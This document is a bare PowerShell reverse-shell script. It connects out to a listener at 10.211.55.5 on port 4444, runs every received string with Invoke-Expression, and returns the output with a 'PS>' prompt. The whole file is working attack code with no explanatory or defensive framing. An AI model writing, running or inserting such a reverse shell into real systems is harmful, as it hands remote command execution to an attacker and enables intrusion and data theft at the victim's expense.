
$TargetIP = "10.211.55.5"
$TargetPort = "4444"

$client = New-Object System.Net.Sockets.TCPClient($TargetIP, $TargetPort)
$stream = $client.GetStream()
$reader = New-Object System.IO.StreamReader($stream)
$writer = New-Object System.IO.StreamWriter($stream)


$buffer = new-object byte[] 4096
While($client.Connected) {
Try {
        $data = $stream.Read($buffer, 0, $buffer.Length)
If($data -gt 0) {
            $cmd = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $data)
            
            $result = iex $cmd 2>&1 | Out-String
            $writer.Write($result + "PS>")
            $writer.Flush()
        }
    } catch { break }
}
$client.Close()
